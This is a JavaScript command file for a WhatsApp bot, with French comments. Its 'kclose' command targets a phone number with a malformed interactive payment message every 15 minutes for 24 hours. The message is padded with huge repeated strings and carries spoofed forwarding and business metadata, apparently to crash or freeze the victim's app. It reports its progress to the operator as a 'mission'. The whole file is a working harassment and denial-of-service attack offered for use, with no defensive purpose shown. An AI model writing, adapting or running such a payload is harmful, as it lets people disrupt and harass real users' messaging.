// kclose.js - Commande complète
export const name = "kclose";

export async function execute(sock, msg, args) {
  try {
    const from = msg.key.remoteJid;
    const q = args[0];

    // Vérification des arguments
    if (!q) {
      return sock.sendMessage(
        from,
        {
          text:
`╔═══❖ 𝗞𝗖𝗟𝗢𝗦𝗘 𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟 ❖═══╗

✖ Cible absente
➤ Syntaxe correcte :
   kclose 237XXXXXXXX

╚════════════════════════════╝`
        },
        { quoted: msg }
      );
    }

    const number = q.replace(/[^0-9]/g, "");
    const target = number + "@s.whatsapp.net";

    // Message de démarrage
    await sock.sendMessage(
      from,
      {
        text:
`╭━━━〔 🔥 𝗞𝗖𝗟𝗢𝗦𝗘 : 𝗜𝗡𝗜𝗧𝗜𝗔𝗧𝗜𝗢𝗡 〕━━━╮

◈ Statut      : ACTIF
◈ Cible       : wa.me/${number}
◈ Protocole   : QueenSqL Adaptation
◈ Durée       : 24 Heures
◈ Intensité   : Maximum

⚡ Initialisation du protocole…
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`
      },
      { quoted: msg }
    );

    // PARAMÈTRES
    const START = Date.now();
    const DURATION = 24 * 60 * 60 * 1000; // 24 heures
    const ACTION_INTERVAL = 15 * 60 * 1000; // 15 minutes
    const MAX_PER_HOUR = 3; // 3 fois par heure

    let hourCount = 0;
    let hourStart = Date.now();
    let executionCount = 0;
    let isRunning = true;

    // Fonction interne pour envoyer le payload
    const sendKclosePayload = async (targetJid) => {
      try {
        const randomHex = (len = 16) =>
          [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");

        // Construction du message complexe
        const messageContent = {
          interactiveMessage: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              messageAssociation: {
                associationType: 2,
                parentMessageKey: randomHex(16)
              },
              messageSecret: randomHex(32),
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
                expiration: -9999,
                ephemeralSettingTimestamp: Date.now(),
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              }),
              isForwarded: true,
              forwardingScore: 1972,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              }
            },
            header: {
              hasMediaAttachment: false
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: JSON.stringify({
                    currency: "IDR",
                    total_amount: { value: 1000000, offset: 100 },
                    reference_id: "KCLOSE_" + randomHex(8),
                    type: "physical-goods",
                    order: {
                      status: "canceled",
                      subtotal: { value: 0, offset: 100 },
                      order_type: "PAYMENT_REQUEST",
                      items: [
                        {
                          retailer_id: "custom-item-" + randomHex(36),
                          name: "KClose Protocol Activation".repeat(100),
                          amount: { value: 1000000, offset: 100 },
                          quantity: 1000
                        }
                      ]
                    },
                    additional_note: "KClose Protocol Execution",
                    native_payment_methods: [],
                    share_payment_status: true
                  })
                }
              ],
              messageParamsJson: "{}"
            },
            annotations: [
              {
                embeddedContent: {
                  embeddedMessage: {
                    message: "KClose Protocol Execution"
                  }
                },
                location: {
                  degreesLongitude: Math.random() * 360 - 180,
                  degreesLatitude: Math.random() * 180 - 90,
                  name: "KClose Target Zone " + randomHex(8)
                },
                polygonVertices: Array.from({ length: 10 }, () => ({
                  x: Math.random() * 200 - 100,
                  y: Math.random() * 200 - 100
                })),
                newsletter: {
                  newsletterJid: randomHex(8) + "@newsletter",
                  newsletterName: "KClose Protocol Bulletin",
                  contentType: "UPDATE",
                  accessibilityText: "ꦽ".repeat(500)
                }
              }
            ]
          }
        };

        // Création et envoi du message
        const waMessage = generateWAMessageFromContent(targetJid, messageContent, {
          userJid: targetJid
        });

        await sock.relayMessage(targetJid, waMessage.message, {
          participant: { jid: targetJid },
          messageId: waMessage.key.id,
          additionalNodes: [
            {
              tag: "interactive",
              attrs: {
                type: "native_flow",
                v: "1"
              },
              content: [
                {
                  tag: "native_flow",
                  attrs: {
                    v: "9",
                    name: "payment_method"
                  },
                  content: [
                    {
                      tag: "extensions_metadata",
                      attrs: {
                        flow_message_version: "3",
                        well_version: "700"
                      },
                      content: []
                    }
                  ]
                }
              ]
            }
          ]
        });

        return true;
      } catch (error) {
        console.error("❌ Erreur dans sendKclosePayload:", error);
        return false;
      }
    };

    // Boucle principale d'exécution
    const executionLoop = async () => {
      while (isRunning && Date.now() - START < DURATION) {
        // Vérifier et réinitialiser le compteur horaire
        if (Date.now() - hourStart >= 60 * 60 * 1000) {
          hourCount = 0;
          hourStart = Date.now();
        }

        // Exécuter si dans la limite horaire
        if (hourCount < MAX_PER_HOUR) {
          try {
            const success = await sendKclosePayload(target);
            if (success) {
              executionCount++;
              hourCount++;
              
              // Message de progression occasionnel
              if (executionCount % 3 === 0) {
                const hoursPassed = Math.floor((Date.now() - START) / (60 * 60 * 1000));
                const remaining = 24 - hoursPassed;
                
                await sock.sendMessage(
                  from,
                  {
                    text:
`📊 𝗞𝗖𝗟𝗢𝗦𝗘 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦𝗜𝗢𝗡

⏱️ Temps écoulé : ${hoursPassed}h
⏳ Temps restant : ${remaining}h
📈 Exécutions : ${executionCount}
🔄 Cette heure : ${hourCount}/${MAX_PER_HOUR}
🎯 Cible : ${number}

⚡ Protocole : ACTIF`
                  },
                  { quoted: msg }
                );
              }
            }
          } catch (execError) {
            console.error("❌ Erreur d'exécution:", execError);
          }
        }

        // Attente avant la prochaine exécution
        await new Promise(resolve => {
          setTimeout(resolve, ACTION_INTERVAL);
        });
      }
    };

    // Démarrer la boucle d'exécution
    await executionLoop();

    // Arrêter l'exécution
    isRunning = false;

    // Rapport final
    const finalReport =
`╔═══❖ 𝗞𝗖𝗟𝗢𝗦𝗘 𝗙𝗜𝗡𝗔𝗟 𝗥𝗘𝗣𝗢𝗥𝗧 ❖═══╗

✅ Mission accomplie
⏱️ Durée totale : 24 heures
📊 Total d'exécutions : ${executionCount}
🎯 Cible traitée : ${number}
🔒 Protocole : QueenSqL Adaptation

🔥 INTENSITÉ : MAXIMUM
🛡️ STATUT : TERMINÉ AVEC SUCCÈS

📋 DÉTAILS :
• Fréquence : ${MAX_PER_HOUR}x/heure
• Intervalle : ${ACTION_INTERVAL / 60000} minutes
• Heure de début : ${new Date(START).toLocaleTimeString()}
• Heure de fin : ${new Date().toLocaleTimeString()}

╚═══════════════════════════════╝`;

    await sock.sendMessage(
      from,
      { text: finalReport },
      { quoted: msg }
    );

  } catch (mainError) {
    console.error("❌ Erreur principale kclose:", mainError);
    
    await sock.sendMessage(
      msg.key.remoteJid,
      {
        text:
`⚠️ 𝗞𝗖𝗟𝗢𝗦𝗘 – 𝗘𝗥𝗥𝗘𝗨𝗥 𝗖𝗥𝗜𝗧𝗜𝗤𝗨𝗘

🛑 Protocole interrompu de force
🔴 Code d'erreur : KCLOSE_FAILURE
📛 Message : ${mainError.message || "Erreur inconnue"}
💀 Statut : ARRÊT D'URGENCE

🔧 Recommandation : Vérifiez les permissions et la connexion.`
      },
      { quoted: msg }
    );
  }
};

// Fonction utilitaire pour générer des messages WhatsApp
// (Assurez-vous que cette fonction existe dans votre projet)
function generateWAMessageFromContent(jid, content, options = {}) {
  // Cette fonction doit être fournie par votre bibliothèque WhatsApp
  // Voici un placeholder basique
  return {
    key: {
      remoteJid: jid,
      fromMe: true,
      id: Math.random().toString(36).substring(2, 15) + 
          Math.random().toString(36).substring(2, 15)
    },
    message: content,
    ...options
  };
}

// Note: Assurez-vous que generateWAMessageFromContent est disponible
// depuis votre bibliothèque WhatsApp (comme baileys)